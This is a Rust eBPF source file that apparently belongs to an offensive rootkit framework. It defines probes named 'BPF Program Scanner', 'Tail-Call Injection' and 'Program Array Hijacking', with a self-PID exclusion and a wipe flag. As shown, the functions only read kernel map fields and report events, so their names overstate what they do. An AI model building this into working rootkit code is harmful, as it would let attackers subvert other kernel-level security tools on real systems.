use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{kprobe, tracepoint},
    programs::{ProbeContext, TracePointContext},
};
use common::{
    EventHeader, EVENT_BPF_PROG_DETECTED, EVENT_PROG_ARRAY_HIJACKED, EVENT_TAILCALL_INJECTED,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 73: BPF Program Scanner
// ──────────────────────────────────────────────

#[tracepoint]
pub fn shadow_bpf_prog_scan(ctx: TracePointContext) -> u32 {
    try_bpf_prog_scan(&ctx).unwrap_or_default()
}

fn try_bpf_prog_scan(ctx: &TracePointContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let cmd: u32 = unsafe { ctx.read_at(8).unwrap_or(0u32) };

    const BPF_PROG_GET_NEXT_ID: u32 = 11;
    const BPF_PROG_GET_FD_BY_ID: u32 = 13;

    if cmd == BPF_PROG_GET_NEXT_ID || cmd == BPF_PROG_GET_FD_BY_ID {
        let prog_id: u32 = unsafe { ctx.read_at(16).unwrap_or(0u32) };

        if prog_id != 0 {
            let name_hash: u64 = prog_id as u64;
            let _ = unsafe { DETECTED_BPF_PROGS.insert(&prog_id, &name_hash, 0) };

            let event = EventHeader {
                event_type: EVENT_BPF_PROG_DETECTED,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: prog_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 74: Tail-Call Injection
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tailcall_inject(ctx: ProbeContext) -> u32 {
    try_tailcall_inject(&ctx).unwrap_or_default()
}

fn try_tailcall_inject(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let map_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let map_type: u32 = unsafe { bpf_probe_read_kernel((map_ptr + 24) as *const u32)? };

    const BPF_MAP_TYPE_PROG_ARRAY: u32 = 3;

    if map_type == BPF_MAP_TYPE_PROG_ARRAY {
        let map_id: u32 = unsafe { bpf_probe_read_kernel((map_ptr + 32) as *const u32)? };

        if unsafe { PARASITE_TARGETS.get(&map_id) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_TAILCALL_INJECTED,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: map_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 75: Program Array Hijacking
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_prog_array_hijack(ctx: ProbeContext) -> u32 {
    try_prog_array_hijack(&ctx).unwrap_or_default()
}

fn try_prog_array_hijack(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let map_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let key_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };

    let map_type: u32 = unsafe { bpf_probe_read_kernel((map_ptr + 24) as *const u32)? };

    const BPF_MAP_TYPE_PROG_ARRAY: u32 = 3;

    if map_type == BPF_MAP_TYPE_PROG_ARRAY {
        let idx: u32 = unsafe { bpf_probe_read_kernel(key_ptr as *const u32)? };
        let map_id: u32 = unsafe { bpf_probe_read_kernel((map_ptr + 32) as *const u32)? };

        if unsafe { DETECTED_BPF_PROGS.get(&map_id) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_PROG_ARRAY_HIJACKED,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((map_id as u64) << 32) | idx as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}
